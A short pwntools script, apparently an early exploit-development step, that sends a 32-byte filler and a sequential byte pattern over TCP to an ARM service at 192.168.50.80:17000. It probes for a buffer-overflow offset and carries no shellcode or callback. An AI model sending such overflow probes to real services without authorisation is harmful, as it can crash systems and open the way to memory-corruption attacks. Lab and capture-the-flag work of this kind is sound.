import sys
import socket
from pwn import *

HOST = '192.168.50.80'
PORT = 17000

context.arch = "arm"

# payload = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f'

payload = b'a'*32
payload += p32(0x01010203) + p32(0x04050607) + p32(0x08090a0b) + p32(0x0c0d0e0f)
payload += p32(0x10111213) + p32(0x14151617) + p32(0x18191a1b) + p32(0x1c1d1f1f)
payload += p32(0x20212223) + p32(0x24252627) + p32(0x28292a2b) + p32(0x2c2d2e2f)
payload += p32(0x30313233) + p32(0x34353637) + p32(0x3839313b) + p32(0x3c3d3e3f)
payload += p32(0x40414243) + p32(0x44454647) + p32(0x48494a4b) + p32(0x4c4d4e4f)
payload += p32(0x50515253) + p32(0x54555657) + p32(0x58595a5b) + p32(0x5c5d5e5f)
payload += p32(0x60616263) + p32(0x64656667) + p32(0x68696a6b) + p32(0x6c6d6e6f)
payload += p32(0x70717273) + p32(0x74757677) + p32(0x78797a7b) + p32(0x7c7d7e7f)
payload += p32(0x80818283) + p32(0x84858687) + p32(0x88898a8b) + p32(0x8c8d8e8f)
payload += p32(0x90919293) + p32(0x94959697) + p32(0x98999a9b) + p32(0x9c9d9e9f)
payload += p32(0xa0a1a2a3) + p32(0xa4a5a6a7) + p32(0xa8a9aaab) + p32(0xacadaeaf)
payload += p32(0xb0b1b2b3) + p32(0xb4b5b6b7) + p32(0xb8b9babb) + p32(0xbcbdbebf)
payload += p32(0xc0c1c2c3) + p32(0xc4c5c6c7) + p32(0xc8c9cacb) + p32(0xcccdcecf)
payload += p32(0xd0d1d2d3) + p32(0xd4d5d6d7) + p32(0xd8d9dadb) + p32(0xdcdddedf)
payload += p32(0xe0e1e2e3) + p32(0xe4e5e6e7) + p32(0xe8e9eaeb) + p32(0xecedeeef)
payload += p32(0xf0f1f2f3) + p32(0xf4f5f6f7) + p32(0xf8f9fafb) + p32(0xfcfdfeff)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall(payload)

s.close()
